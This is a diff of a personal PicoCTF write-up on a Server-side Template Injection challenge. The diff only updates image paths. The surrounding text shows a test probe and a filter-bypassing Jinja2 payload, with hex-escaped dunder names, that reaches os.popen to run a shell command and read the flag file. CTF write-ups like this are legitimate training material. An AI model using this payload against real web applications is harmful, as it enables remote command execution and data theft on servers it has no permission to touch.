@@ -10,7 +10,7 @@ We know that it is a Server-side Template Injection vulnerability and as you can
 
 So I tried to type {{7fois7}} to see if it is vulnerable 
 
-![](../../PicoCTF-assets/Pasted%20image%2020260222115046.png)
+![](../../../ALL-assets/PicoCTF-assets/Pasted%20image%2020260222115046.png)
 
 And boom it rendered 49 so it is vulnerable to SSTI 
 
@@ -42,13 +42,13 @@ I found this payload (in the worst case --> you can use AI)
 
 I then found that there is this :
 
-![](../../PicoCTF-assets/Pasted%20image%2020260222121201.png)
+![](../../../ALL-assets/PicoCTF-assets/Pasted%20image%2020260222121201.png)
 
 So I modified the payload to open the flag : 
 
 {{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 
-![](../../PicoCTF-assets/Pasted%20image%2020260222121305.png)
+![](../../../ALL-assets/PicoCTF-assets/Pasted%20image%2020260222121305.png)
 
 
 
